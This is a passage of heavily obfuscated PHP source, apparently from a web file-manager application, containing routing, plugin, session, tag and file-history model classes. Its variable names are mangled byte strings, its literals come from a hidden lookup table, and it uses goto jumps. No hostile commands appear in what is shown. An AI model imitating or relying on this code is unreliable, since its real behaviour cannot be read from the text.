$ˆÖˆÎûÆ[1903]); $this->link($ˆÖˆÎûÆ[1906], $ˆÖˆÎûÆ[1902]); $this->link($ˆÖˆÎûÆ[1907], $ˆÖˆÎûÆ[1902]); $this->link($ˆÖˆÎûÆ[1908], $ˆÖˆÎûÆ[1902]); $this->link($ˆÖˆÎûÆ[1909], $ˆÖˆÎûÆ[1902]); if ($ãµ”÷¥ä) { Hook::trigger($ˆÖˆÎûÆ[1910]); } return; } $Óùâ¯¸ = $this->url($ªÊ©­Ë, $˜…Šğ–¿, !1); if (substr($ªÊ©­Ë, -3) == $ˆÖˆÎûÆ[1911]) { echo $ˆÖˆÎûÆ[1912] . $Óùâ¯¸ . $ˆÖˆÎûÆ[1913] . $ˆÖˆÎûÆ[285]; } else { if (substr($ªÊ©­Ë, -4) == $ˆÖˆÎûÆ[1914]) { echo $ˆÖˆÎûÆ[1915] . $Óùâ¯¸ . $ˆÖˆÎûÆ[1916] . $ˆÖˆÎûÆ[285]; } } if ($ãµ”÷¥ä) { Hook::trigger($ˆÖˆÎûÆ[1910]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\x5b\x5e\x2f\x5d\x2b", "\x3a\156\165\155" => "\x5b\60\55\x39\135\53", "\72\141\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($·É·ËÀŒ, $şÒÕáÚœ) { $éŒâ•ì™ =& $_SERVER[ïÃ°£«Ê]; if ($·É·ËÀŒ == $éŒâ•ì™[1917]) { $äÏ˜¯­ = array_map($éŒâ•ì™[1918], $şÒÕáÚœ[0]); $æ†£º³£ = strpos($şÒÕáÚœ[1], $éŒâ•ì™[8]) === 0 ? $şÒÕáÚœ[1] : $éŒâ•ì™[8] . $şÒÕáÚœ[1]; $³ë°Ó¡Û = $şÒÕáÚœ[2]; } else { $äÏ˜¯­ = null; $æ†£º³£ = strpos($şÒÕáÚœ[0], $éŒâ•ì™[8]) === 0 ? $şÒÕáÚœ[0] : $éŒâ•ì™[8] . $şÒÕáÚœ[0]; $³ë°Ó¡Û = $şÒÕáÚœ[1]; } array_push(self::$maps, $äÏ˜¯­); array_push(self::$routes, $æ†£º³£); array_push(self::$methods, strtoupper($·É·ËÀŒ)); array_push(self::$callbacks, $³ë°Ó¡Û); } public static function error($’âš¾ù‘) { self::$errorCallback = $’âš¾ù‘; } public static function haltOnMatch($ÒÅ•å°÷ = true) { self::$halts = $ÒÅ•å°÷; } public static function dispatch() { $ãŒ»÷¦š =& $_SERVER[ïÃ°£«Ê]; $ä«Ç×»‘ = parse_url($_SERVER[$ãŒ»÷¦š[1919]], PHP_URL_PATH); $ÊŒÌÊèØ = $_SERVER[$ãŒ»÷¦š[161]]; $Äƒğëæ¡ = array_keys(static::$patterns); $©ñ‘§¨  = array_values(static::$patterns); $ƒ‹¶ğÀı = !1; self::$routes = preg_replace($ãŒ»÷¦š[1468], $ãŒ»÷¦š[8], self::$routes); if (in_array($ä«Ç×»‘, self::$routes)) { $êöˆä«± = array_keys(self::$routes, $ä«Ç×»‘); foreach ($êöˆä«± as $ÂÇ»÷») { if (self::$methods[$ÂÇ»÷»] == $ÊŒÌÊèØ || self::$methods[$ÂÇ»÷»] == $ãŒ»÷¦š[1920] || in_array($ÊŒÌÊèØ, self::$maps[$ÂÇ»÷»])) { $ƒ‹¶ğÀı = !0; if (!is_object(self::$callbacks[$ÂÇ»÷»])) { $˜Ñíñ = explode($ãŒ»÷¦š[8], self::$callbacks[$ÂÇ»÷»]); $ª”†ãŞ = end($˜Ñíñ); $€Ù´Ô¬Â = explode($ãŒ»÷¦š[1400], $ª”†ãŞ); $Šıà§°œ = new $€Ù´Ô¬Â[0](); $Šıà§°œ->{$€Ù´Ô¬Â[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ÂÇ»÷»]); if (self::$halts) { return; } } } } } else { $¢î›‘¢Â = 0; foreach (self::$routes as $ÂÇ»÷») { if (strpos($ÂÇ»÷», $ãŒ»÷¦š[4]) !== !1) { $ÂÇ»÷» = str_replace($Äƒğëæ¡, $©ñ‘§¨ , $ÂÇ»÷»); } if (preg_match($ãŒ»÷¦š[1921] . $ÂÇ»÷» . $ãŒ»÷¦š[1922], $ä«Ç×»‘, $ê¶…ÈÕ„)) { if (self::$methods[$¢î›‘¢Â] == $ÊŒÌÊèØ || self::$methods[$¢î›‘¢Â] == $ãŒ»÷¦š[1920] || !empty(self::$maps[$¢î›‘¢Â]) && in_array($ÊŒÌÊèØ, self::$maps[$¢î›‘¢Â])) { $ƒ‹¶ğÀı = !0; array_shift($ê¶…ÈÕ„); if (!is_object(self::$callbacks[$¢î›‘¢Â])) { $˜Ñíñ = explode($ãŒ»÷¦š[8], self::$callbacks[$¢î›‘¢Â]); $ª”†ãŞ = end($˜Ñíñ); $€Ù´Ô¬Â = explode($ãŒ»÷¦š[1400], $ª”†ãŞ); $Šıà§°œ = new $€Ù´Ô¬Â[0](); if (!method_exists($Šıà§°œ, $€Ù´Ô¬Â[1])) { echo $ãŒ»÷¦š[1923]; } else { call_user_func_array(array($Šıà§°œ, $€Ù´Ô¬Â[1]), $ê¶…ÈÕ„); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$¢î›‘¢Â], $ê¶…ÈÕ„); if (self::$halts) { return; } } } } $¢î›‘¢Â++; } } if ($ƒ‹¶ğÀı == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $µÖşàÁÙ =& $_SERVER[ïÃ°£«Ê]; header($_SERVER[$µÖşàÁÙ[1924]] . $µÖşàÁÙ[1925]); echo $µÖşàÁÙ[1926]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ãŒ»÷¦š[1919]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto eˆŒÏ‡«È†; d „İÅÖ¨„: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\x66\x61\x76"; protected function cacheFunctionAlias($í«•âœğ) { $¨ÄÏæĞØ =& $_SERVER[ïÃ°£«Ê]; return array($¨ÄÏæĞØ[2297] => array($í«•âœğ[0], $¨ÄÏæĞØ[2298]), $¨ÄÏæĞØ[2299] => array($í«•âœğ[0], $¨ÄÏæĞØ[2300])); } protected function ___get($Íİ—½¯) { $Ãßı¯ù¬ =& $_SERVER[ïÃ°£«Ê]; $­‹ïÆ®® = Model($Ãßı¯ù¬[605])->metaGet($Íİ—½¯, $Ãßı¯ù¬[2301]); $Âïİó˜Ê = json_decode($­‹ïÆ®®, !0); return $Âïİó˜Ê ? $Âïİó˜Ê : array($Ãßı¯ù¬[2302] => $Ãßı¯ù¬[91], $Ãßı¯ù¬[446] => array()); } protected function ___listData($çãÓ“¡›) { $Ÿ¶°Ì†± =& $_SERVER[ïÃ°£«Ê]; $Úá¢ŞË„ = array($Ÿ¶°Ì†±[1971] => 0, $Ÿ¶°Ì†±[573] => array($Ÿ¶°Ì†±[2303], 0), $Ÿ¶°Ì†±[511] => $Ÿ¶°Ì†±[1493] . $çãÓ“¡›); $ğ’Ô·ó = $Ÿ¶°Ì†±[2304]; $‘°şÏÄ§ = $this->field($ğ’Ô·ó)->where($Úá¢ŞË„)->order($Ÿ¶°Ì†±[2305])->select(); return $‘°şÏÄ§ ? $‘°şÏÄ§ : array(); } protected function set($¸ÃÏñĞ¯, $À£ŞÅŸş) { $§´ÑÇ‚ì =& $_SERVER[ïÃ°£«Ê]; $À£ŞÅŸş = $À£ŞÅŸş ? $À£ŞÅŸş : array($§´ÑÇ‚ì[2302] => $§´ÑÇ‚ì[91], $§´ÑÇ‚ì[446] => array()); return Model($§´ÑÇ‚ì[605])->metaSet($¸ÃÏñĞ¯, $§´ÑÇ‚ì[2301], json_encode($À£ŞÅŸş)); } protected function getByTagID($¨ôøØÛ, $€Ôúî¤õ) { $üÛ§·‡Û =& $_SERVER[ïÃ°£«Ê]; if (!$¨ôøØÛ || !$€Ôúî¤õ) { return !1; } if (!Model($üÛ§·‡Û[605])->getInfoSimple($¨ôøØÛ)) { return !1; } $â‘ÓÌ‚ = $this->get($¨ôøØÛ); if (!$â‘ÓÌ‚ || !isset($â‘ÓÌ‚[$üÛ§·‡Û[446]])) { return !1; } $«Ç¥—‘• = array_find_by_field($â‘ÓÌ‚[$üÛ§·‡Û[446]], $üÛ§·‡Û[487], $€Ôúî¤õ); return is_array($«Ç¥—‘•) ? $«Ç¥—‘• : !1; } public function listSource($êé¯˜­, $²ª›ú±à) { $‘÷û ‹³ =& $_SERVER[ïÃ°£«Ê]; if ($²ª›ú±à && !is_array($²ª›ú±à)) { $²ª›ú±à = array($²ª›ú±à); } $ªŠ°Ø¼• = $this->get($êé¯˜­); $Ìü‘¦Ëæ = array_to_keyvalue($ªŠ°Ø¼•[$‘÷û ‹³[446]], $‘÷û ‹³[487]); $ûø°†ì‡ = array_to_keyvalue($ªŠ°Ø¼•[$‘÷û ‹³[598]], $‘÷û ‹³[487]); $ŞÌä½ğ = $this->listData($êé¯˜­); $Ê…•„ï = array(); foreach ($²ª›ú±à as $¨úÄíÇ) { $ÓÚƒ¦Ÿš = $Ìü‘¦Ëæ[$¨úÄíÇ]; $Ü¦«²ôš = _get($ÓÚƒ¦Ÿš, $‘÷û ‹³[598]); if (!$ÓÚƒ¦Ÿš || !$Ü¦«²ôš || !$ûø°†ì‡[$Ü¦«²ôš]) { continue; } if (!$Ê…•„ï[$Ü¦«²ôš]) { $Ê…•„ï[$Ü¦«²ôš] = array(); } $Ê…•„ï[$Ü¦«²ôš][] = $¨úÄíÇ; } $¥¦áµÜ = array(); $í‹ššÀ‡ = array(); foreach ($ŞÌä½ğ as $”œğÃ‘Ñ) { $ÈÀ¨÷Ò = $”œğÃ‘Ñ[$‘÷û ‹³[87]]; $ÓÚƒ¦Ÿš = $Ìü‘¦Ëæ[$”œğÃ‘Ñ[$‘÷û ‹³[515]]]; $Ü¦«²ôš = _get($ÓÚƒ¦Ÿš, $‘÷û ‹³[598]); if (!$ÓÚƒ¦Ÿš || !$Ü¦«²ôš || !$Ê…•„ï[$Ü¦«²ôš] || !$ÈÀ¨÷Ò) { continue; } if (!in_array($”œğÃ‘Ñ[$‘÷û ‹³[515]], $Ê…•„ï[$Ü¦«²ôš])) { continue; } if (!$¥¦áµÜ[$ÈÀ¨÷Ò]) { $¥¦áµÜ[$ÈÀ¨÷Ò] = array(); } $¥¦áµÜ[$ÈÀ¨÷Ò][] = $Ü¦«²ôš; } foreach ($¥¦áµÜ as $ÈÀ¨÷Ò => $æû­ãƒÏ) { if (count($æû­ãƒÏ) != count($Ê…•„ï)) { continue; } $í‹ššÀ‡[] = $ÈÀ¨÷Ò; } if (!$²ª›ú±à) { $í‹ššÀ‡ = array_to_keyvalue($ŞÌä½ğ, $‘÷û ‹³[12], $‘÷û ‹³[87]); } $í‹ššÀ‡ = array_unique($í‹ššÀ‡); if (!$í‹ššÀ‡) { return array(); } $Ê½ô = array($‘÷û ‹³[506] => array($‘÷û ‹³[507], $í‹ššÀ‡), $‘÷û ‹³[589] => $êé¯˜­, $‘÷û ‹³[188] => SourceModel::TYPE_GROUP); $œîŞ¥Íê = Model($‘÷û ‹³[1535])->listSource($Ê½ô); if (!$œîŞ¥Íê || count($í‹ššÀ‡) == $œîŞ¥Íê[$‘÷û ‹³[443]][$‘÷û ‹³[444]]) { return $œîŞ¥Íê; } $æĞ³¯ø = array(); $‘ûÌä®‚ = array_to_keyvalue($œîŞ¥Íê[$‘÷û ‹³[85]], $‘÷û ‹³[12], $‘÷û ‹³[191]); $ôõ»ªŸì = array_to_keyvalue($œîŞ¥Íê[$‘÷û ‹³[86]], $‘÷û ‹³[12], $‘÷û ‹³[191]); $»âÕ­’æ = array_merge($ôõ»ªŸì, $‘ûÌä®‚); foreach ($í‹ššÀ‡ as $ÈÀ¨÷Ò) { if (!in_array($ÈÀ¨÷Ò, $»âÕ­’æ)) { $æĞ³¯ø[] = $ÈÀ¨÷Ò; } } if ($æĞ³¯ø) { $this->removeBySource($êé¯˜­, $æĞ³¯ø); } return $œîŞ¥Íê; } protected function addToTag($úÜ‰è, $øìÏ•€É, $µèˆİÌ) { $üÀƒ£„œ =& $_SERVER[ïÃ°£«Ê]; if (!$this->getByTagID($úÜ‰è, $µèˆİÌ) || !$øìÏ•€É) { return !1; } if (!Model($üÀƒ£„œ[934])->pathInfo($øìÏ•€É)) { return !1; } $°´ùîôò = array($üÀƒ£„œ[1971] => 0, $üÀƒ£„œ[573] => $µèˆİÌ, $üÀƒ£„œ[510] => $øìÏ•€É, $üÀƒ£„œ[511] => $üÀƒ£„œ[2306] . $úÜ‰è, $üÀƒ£„œ[509] => $üÀƒ£„œ[12], $üÀƒ£„œ[2189] => 0); if ($this->where($°´ùîôò)->find()) { return !1; } return $this->add($°´ùîôò); } protected function removeFromTag($¬µ¿Ù´Ç, $–³ì¥, $àƒçÂÓÂ) { $õ‘ÜşË€ =& $_SERVER[ïÃ°£«Ê]; if (!$this->getByTagID($¬µ¿Ù´Ç, $àƒçÂÓÂ) || !$–³ì¥) { return !1; } if (is_array($–³ì¥)) { $–³ì¥ = array($õ‘ÜşË€[7], $–³ì¥); } $‹’üÔÕë = array($õ‘ÜşË€[1971] => 0, $õ‘ÜşË€[573] => $àƒçÂÓÂ, $õ‘ÜşË€[511] => $õ‘ÜşË€[2306] . $¬µ¿Ù´Ç, $õ‘ÜşË€[510] => $–³ì¥); return $this->where($‹’üÔÕë)->delete(); } protected function removeByTag($­°¹ôÂí, $Â¬š¤ÊÎ) { $Ö©ØÌò¥ =& $_SERVER[ïÃ°£«Ê]; if (!$this->getByTagID($­°¹ôÂí, $Â¬š¤ÊÎ)) { return !1; } $ßÖ íÈ = array($Ö©ØÌò¥[1971] => 0, $Ö©ØÌò¥[573] => $Â¬š¤ÊÎ, $Ö©ØÌò¥[511] => $Ö©ØÌò¥[2306] . $­°¹ôÂí); return $this->where($ßÖ íÈ)->delete(); } protected function removeBySource($¡Ğ¹ß¤, $Áôİ—ğ) { $Å€¥ó Š =& $_SERVER[ïÃ°£«Ê]; if (!$¡Ğ¹ß¤ || !$Áôİ—ğ) { return !1; } if (is_array($Áôİ—ğ)) { $Áôİ—ğ = array($Å€¥ó Š[7], $Áôİ—ğ); } $æåóªƒ = array($Å€¥ó Š[1971] => 0, $Å€¥ó Š[510] => $Áôİ—ğ, $Å€¥ó Š[573] => array($Å€¥ó Š[1182], 0), $Å€¥ó Š[511] => $Å€¥ó Š[2306] . $¡Ğ¹ß¤); return $this->where($æåóªƒ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\x70\154\165\x67\x69\156\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\x73\164\141\x74\165\x73", "\x72\x65\147\151\x65\x73\164", "\x63\157\x6e\x66\x69\147"); public function loadList($ÙÍË½û² = false) { $‡ú›Ö´É = array_to_keyvalue($this->listData(), $_SERVER[ïÃ°£«Ê][32]); if ($ÙÍË½û²) { return $‡ú›Ö´É[$ÙÍË½û²]; } return $‡ú›Ö´É; } public function init() { $Ùê‘Æ‹Ô =& $_SERVER[ïÃ°£«Ê]; Hook::trigger($Ùê‘Æ‹Ô[2307]); $ş±öæùÙ = $this->loadPluginList(); foreach ($ş±öæùÙ as $¸–Óæ½Ó => $Äª¯ÚëÂ) { $µÖ§òŠ = $this->appAllow($¸–Óæ½Ó, $Äª¯ÚëÂ); if (!$µÖ§òŠ) { continue; } foreach ($Äª¯ÚëÂ[$Ùê‘Æ‹Ô[2308]] as $ÒÓŸß§œ => $¨‡®“Æ) { Hook::bind($ÒÓŸß§œ, $¨‡®“Æ); } } Hook::trigger($Ùê‘Æ‹Ô[2309]); Hook::trigger(ACTION); } public function appAllow($±şşµ§², $×²«È§, $»µ«ü¯¿ = true) { $Õ”¸‹» =& $_SERVER[ïÃ°£«Ê]; $³›É¸•¦ = PLUGIN_DIR . $±şşµ§² . $Õ”¸‹»[2310]; if (!is_array($×²«È§) || !is_array($×²«È§[$Õ”¸‹»[2308]]) || $×²«È§[$Õ”¸‹»[851]] != 1 || !is_file($³›É¸•¦)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Õ”¸‹»[6]][$Õ”¸‹»[2311]] || !$GLOBALS[$Õ”¸‹»[6]][$Õ”¸‹»[2312]]) { return !0; } $±Ù‹¯Õ¶ = explode($Õ”¸‹»[50], strtolower($GLOBALS[$Õ”¸‹»[6]][$Õ”¸‹»[2312]])); return in_array(strtolower($±şşµ§²), $±Ù‹¯Õ¶) ? !1 : !0; } if ($»µ«ü¯¿ && !Action($Õ”¸‹»[2313])->checkAuth($±şşµ§²)) { return !1; } return !0; } public function unInstall($úÛŞõ§´) { $Ş²³˜÷Â =& $_SERVER[ïÃ°£«Ê]; $õî®£‰ = $this->loadList($úÛŞõ§´); if (file_exists(PLUGIN_DIR . $úÛŞõ§´)) { Hook::apply($úÛŞõ§´ . $Ş²³˜÷Â[2314]); } $this->remove($õî®£‰[$Ş²³˜÷Â[487]]); } public function changeStatus($ßœ–’±, $ÊÌĞ‘‚˜) { $òîÌÔÎ =& $_SERVER[ïÃ°£«Ê]; $¢„İÁ = $this->loadList($ßœ–’±); if ($ÊÌĞ‘‚˜) { Hook::apply($ßœ–’± . $òîÌÔÎ[2315]); } $this->update($¢„İÁ[$òîÌÔÎ[487]], array($òîÌÔÎ[2316] => $ÊÌĞ‘‚˜)); } public function appRegist($Ç™—å®ˆ, $¬×üéÆ») { $„ùÌÁØú =& $_SERVER[ïÃ°£«Ê]; $¦Š›´ÍÕ = $this->loadList($Ç™—å®ˆ); if ($¦Š›´ÍÕ) { $this->update($¦Š›´ÍÕ[$„ùÌÁØú[487]], array($„ùÌÁØú[2308] => $¬×üéÆ»)); } else { $Ÿµ¦Œëˆ = array($„ùÌÁØú[32] => $Ç™—å®ˆ, $„ùÌÁØú[2308] => $¬×üéÆ», $„ùÌÁØú[851] => 0, $„ùÌÁØú[6] => $this->getConfigDefault($Ç™—å®ˆ)); $this->insert($Ÿµ¦Œëˆ); } } public function getConfigDefault($–‘ÖšÚù) { $ş˜ÇÛ“ =& $_SERVER[ïÃ°£«Ê]; $–×ø›£ = array(); $ú‰Ü‡ÅÚ = $this->getPackageJson($–‘ÖšÚù); if (!$ú‰Ü‡ÅÚ && is_array($ú‰Ü‡ÅÚ[$ş˜ÇÛ“[2317]])) { return $–×ø›£; } foreach ($ú‰Ü‡ÅÚ[$ş˜ÇÛ“[2317]] as $ßûÉ¦ÌŠ => $²°ñ½§…) { if (!isset($²°ñ½§…[$ş˜ÇÛ“[451]]) || isset($–×ø›£[$ßûÉ¦ÌŠ])) { continue; } $–×ø›£[$ßûÉ¦ÌŠ] = $²°ñ½§…[$ş˜ÇÛ“[451]]; } return $–×ø›£; } public function getPackageJson($—ÏªØ¯“) { return Hook::apply($—ÏªØ¯“ . $_SERVER[ïÃ°£«Ê][2318]); } public function getConfig($õÂ¢¹¿½, $Ø¤Í£ã© = false) { $ãÔôŠè =& $_SERVER[ïÃ°£«Ê]; $şàã–É = array(); $ûÂÏ½ßß = $this->loadList($õÂ¢¹¿½); if ($ûÂÏ½ßß && is_array($ûÂÏ½ßß[$ãÔôŠè[6]])) { $şàã–É = $ûÂÏ½ßß[$ãÔôŠè[6]]; } if (!$şàã–É || $Ø¤Í£ã©) { $şàã–É = $this->getConfigDefault($õÂ¢¹¿½); } return $şàã–É; } public function setConfig($ºü×Í¿›, $ÄÜ˜×ƒ¾ = false) { $™±³©– =& $_SERVER[ïÃ°£«Ê]; $™¢“—ÖŞ = $this->loadList($ºü×Í¿›); if (!$™¢“—ÖŞ) { return !1; } $Ïâ¢¾¡ = $™¢“—ÖŞ[$™±³©–[6]]; if ($ÄÜ˜×ƒ¾ == !1) { $Ïâ¢¾¡ = array(); $ÄÜ˜×ƒ¾ = $this->getConfigDefault($ºü×Í¿›); } foreach ($ÄÜ˜×ƒ¾ as $³Â›Ä· => $³™¶ßº”) { $Ïâ¢¾¡[$³Â›Ä·] = is_string($³™¶ßº”) ? trim($³™¶ßº”) : $³™¶ßº”; } $this->update($™¢“—ÖŞ[$™±³©–[487]], array($™±³©–[6] => $Ïâ¢¾¡)); } public function viewList() { $„º°Û =& $_SERVER[ïÃ°£«Ê]; $•êÍ—ì„ = $this->loadList(); $this->pluginScan($•êÍ—ì„); $•êÍ—ì„ = $this->loadPluginList(); $şÈ±¶°Ÿ = array(); foreach ($•êÍ—ì„ as $Œ‚İœü => $ÚàÊ¢¸Ñ) { $Ûë‘¬è¦ = $ÚàÊ¢¸Ñ; unset($ÚàÊ¢¸Ñ[$„º°Û[2308]], $ÚàÊ¢¸Ñ[$„º°Û[6]]); $šñ¾ÕÖ = PLUGIN_DIR . $ÚàÊ¢¸Ñ[$„º°Û[32]] . $„º°Û[2310]; if (!is_file($šñ¾ÕÖ)) { continue; } $ÖıÄ‰Èü = Hook::apply($ÚàÊ¢¸Ñ[$„º°Û[32]] . $„º°Û[2318]); if (!is_array($ÖıÄ‰Èü)) { continue; } $şÈ±¶°Ÿ[$Œ‚İœü] = array_merge($ÚàÊ¢¸Ñ, $ÖıÄ‰Èü); if ($Ûë‘¬è¦[$„º°Û[6]][$„º°Û[1894]] != $ÖıÄ‰Èü[$„º°Û[1868]]) { Hook::apply($ÚàÊ¢¸Ñ[$„º°Û[32]] . $„º°Û[2315]); $Ûë‘¬è¦[$„º°Û[6]][$„º°Û[1894]] = $ÖıÄ‰Èü[$„º°Û[1868]]; $this->update($ÚàÊ¢¸Ñ[$„º°Û[487]], array($„º°Û[6] => $Ûë‘¬è¦[$„º°Û[6]])); } } return $şÈ±¶°Ÿ; } private function loadPluginList() { $™‡¬úİ =& $_SERVER[ïÃ°£«Ê]; $¹Ë¾–€¹ = $this->loadList(); if (strtolower(MOD) == $™‡¬úİ[2319]) { return $¹Ë¾–€¹; } $ã²ëãÈ¶ = Hook::trigger($™‡¬úİ[2320], $¹Ë¾–€¹); if ($¹Ë¾–€¹ && !$ã²ëãÈ¶) { die; } return $ã²ëãÈ¶ ? $ã²ëãÈ¶ : $¹Ë¾–€¹; } private function pluginScan($ø¤·ò) { $ç¡£öš¾ =& $_SERVER[ïÃ°£«Ê]; recursion_dir(PLUGIN_DIR, $ĞŸçì«¸, $´óö¹‡, 0); foreach ($ĞŸçì«¸ as $Ù³³à Ã) { $ÉÎ›ïïò = get_path_this($Ù³³à Ã); if (isset($ø¤·ò[$ÉÎ›ïïò]) || !file_exists($Ù³³à Ã . $ç¡£öš¾[2321]) || !file_exists($Ù³³à Ã . $ç¡£öš¾[2310])) { continue; } Hook::apply($ÉÎ›ïïò . $ç¡£öš¾[2315]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\x6d\137\x73\145\x73\163\x69\157\x6e"; public function get($ã•êµí™) { $ƒ†÷ÇŸÆ =& $_SERVER[ïÃ°£«Ê]; $ÉÉšÓ… = $this->where(array($ƒ†÷ÇŸÆ[2322] => $ã•êµí™))->find(); if (!is_array($ÉÉšÓ…)) { return !1; } return $ÉÉšÓ…[$ƒ†÷ÇŸÆ[168]]; } public function set($¡ğö€€Ø, $ÂÉß‹, $Úã‰ùÜ’ = 3600) { $¸Å›úüë =& $_SERVER[ïÃ°£«Ê]; $£Âúãíº = array($¸Å›úüë[2322] => $¡ğö€€Ø, $¸Å›úüë[2225] => $ÂÉß‹, $¸Å›úüë[2323] => $Úã‰ùÜ’ + time()); if (Session::get($¸Å›úüë[2324])) { $£Âúãíº[$¸Å›úüë[1594]] = Session::get($¸Å›úüë[2324]); } else { $£Âúãíº[$¸Å›úüë[1594]] = 0; } if ($this->get($¡ğö€€Ø)) { return $this->where(array($¸Å›úüë[2322] => $¡ğö€€Ø))->save($£Âúãíº); } else { return $this->add($£Âúãíº, array(), !0); } } public function remove($Ø¡ùÛí) { return $this->where(array($_SERVER[ïÃ°£«Ê][2322] => $Ø¡ùÛí))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ïÃ°£«Ê][2325] . time())->delete(); } } goto b¬Èë”‰†Ô; E»Ÿ‘’¿âæ: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\162\143\145\x5f\150\151\x73\164\x6f\x72\x79"; public function historyCount($ó¬„û¶†) { $üô¾ùÂØ =& $_SERVER[ïÃ°£«Ê]; if (!$ó¬„û¶†) { return array(); } if (is_string($ó¬„û¶†) || is_int($ó¬„û¶†)) { $ó¬„û¶† = array($ó¬„û¶†); } $ßÂËÒÁ™ = array($üô¾ùÂØ[191], $üô¾ùÂØ[950] => $üô¾ùÂØ[585]); $¬Ê¤™’Ö = array($üô¾ùÂØ[191] => array($üô¾ùÂØ[7], $ó¬„û¶†)); $şñù»Ñ = $this->field($ßÂËÒÁ™)->where($¬Ê¤™’Ö)->group($üô¾ùÂØ[191])->select(); return array_to_keyvalue($şñù»Ñ, $üô¾ùÂØ[191], $üô¾ùÂØ[585]); } public function addHistory($Ç¬ÉØ¢, $ë£ÃÙ•Ñ = '') { $ƒá–ïÌÌ =& $_SERVER[ïÃ°£«Ê]; $®òˆÇÃü = array($ƒá–ïÌÌ[506] => $Ç¬ÉØ¢[$ƒá–ïÌÌ[191]], $ƒá–ïÌÌ[1971] => isset($Ç¬ÉØ¢[$ƒá–ïÌÌ[543]]) ? $Ç¬ÉØ¢[$ƒá–ïÌÌ[543]] : $Ç¬ÉØ¢[$ƒá–ïÌÌ[541]], $ƒá–ïÌÌ[558] => $Ç¬ÉØ¢[$ƒá–ïÌÌ[557]], $ƒá–ïÌÌ[640] => $Ç¬ÉØ¢[$ƒá–ïÌÌ[79]], $ƒá–ïÌÌ[2438] => $ë£ÃÙ•Ñ); if ($GLOBALS[$ƒá–ïÌÌ[6]][$ƒá–ïÌÌ[92]][$ƒá–ïÌÌ[1409]] >= 1) { $this->historyAutoClear($®òˆÇÃü[$ƒá–ïÌÌ[191]]); $this->add($®òˆÇÃü); } Hook::trigger($ƒá–ïÌÌ[2439], $®òˆÇÃü); Model($ƒá–ïÌÌ[2440])->eventFileEdit($Ç¬ÉØ¢[$ƒá–ïÌÌ[191]]); } private function historyAutoClear($æ±•ÕòÅ) { $”´œª¯ñ =& $_SERVER[ïÃ°£«Ê]; $¢ğ†„ô£ = Model($”´œª¯ñ[874])->get($”´œª¯ñ[962]); $í‘¬¿­¿ = intval($GLOBALS[$”´œª¯ñ[6]][$”´œª¯ñ[92]][$”´œª¯ñ[1409]]); $€°ß’Ø† = $¢ğ†„ô£ == $”´œª¯ñ[963] ? min(5, $í‘¬¿­¿) : $í‘¬¿­¿; $€°ß’Ø† = $€°ß’Ø† <= 0 ? 0 : $€°ß’Ø† - 1; if ($€°ß’Ø† >= 499) { return; } $ì”•»¹ƒ = array($”´œª¯ñ[506] => $æ±•ÕòÅ); $öÖ«ŠœÌ = $this->field($”´œª¯ñ[2441])->where($ì”•»¹ƒ)->order($”´œª¯ñ[2435])->select(); if (!$öÖ«ŠœÌ || $€°ß’Ø† >= count($öÖ«ŠœÌ)) { return; } $½î×¸æÑ = array_to_keyvalue($öÖ«ŠœÌ, $”´œª¯ñ[12], $”´œª¯ñ[487]); $½î×¸æÑ = array_slice($½î×¸æÑ, $€°ß’Ø†); $İªø¯Ï£ = array_to_keyvalue($öÖ«ŠœÌ, $”´œª¯ñ[12], $”´œª¯ñ[557]); $İªø¯Ï£ = array_slice($İªø¯Ï£, $€°ß’Ø†); if (!$½î×¸æÑ || !$İªø¯Ï£) { return; } $ì”•»¹ƒ = array($”´œª¯ñ[508] => array($”´œª¯ñ[7], $½î×¸æÑ)); $this->where($ì”•»¹ƒ)->delete(); Model($”´œª¯ñ[560])->remove($İªø¯Ï£); } public function listData($çŸ¾‡òá) { $¥—ŞÈÍÏ =& $_SERVER[ïÃ°£«Ê]; $§ëÁªÎÓ = array($¥—ŞÈÍÏ[506] => $çŸ¾‡òá); $ßƒë©®• = $¥—ŞÈÍÏ[2442]; $Äƒºü‰  = $this->field($ßƒë©®•)->where($§ëÁªÎÓ)->order($¥—ŞÈÍÏ[2435])->selectPage(); $this->_listAppendUser($Äƒºü‰ [$¥—ŞÈÍÏ[446]]); $õëÛÒ¡ = Model($¥—ŞÈÍÏ[874])->get($¥—ŞÈÍÏ[962]); $½¹ ïÙ” = 5; if ($õëÛÒ¡ == $¥—ŞÈÍÏ[963]) { $Äƒºü‰ [$¥—ŞÈÍÏ[446]] = array_slice($Äƒºü‰ [$¥—ŞÈÍÏ[446]], 0, $½¹ ïÙ”); $Äƒºü‰ [$¥—ŞÈÍÏ[443]] = array($¥—ŞÈÍÏ[2443] => 1, $¥—ŞÈÍÏ[2444] => 20, $¥—ŞÈÍÏ[2445] => 1, $¥—ŞÈÍÏ[2334] => count($Äƒºü‰ [$¥—ŞÈÍÏ[446]])); } return $Äƒºü‰ ; } protected function _listAppendUser(&$ÛÓìĞà–) { $ô…ğíâı =& $_SERVER[ïÃ°£«Ê]; $×ÚÛİÀ = array_to_keyvalue($ÛÓìĞà–, $ô…ğíâı[12], $ô…ğíâı[1594]); $ı–äØñÓ = Model($ô…ğíâı[617])->userListInfo($×ÚÛİÀ); foreach ($ÛÓìĞà– as &$Ã­Û£ú½) { $ûıÓÊ‰Â = $Ã­Û£ú½[$ô…ğíâı[1594]]; $Ã­Û£ú½[$ô…ğíâı[541]] = $ı–äØñÓ[$ûıÓÊ‰Â] ? $ı–äØñÓ[$ûıÓÊ‰Â] : !1; } unset($Ã­Û£ú½); } public function fileInfo($ÍÜÖˆøË, $ı¤çÎÃ = false) { $ºµºÙšõ =& $_SERVER[ïÃ°£«Ê]; 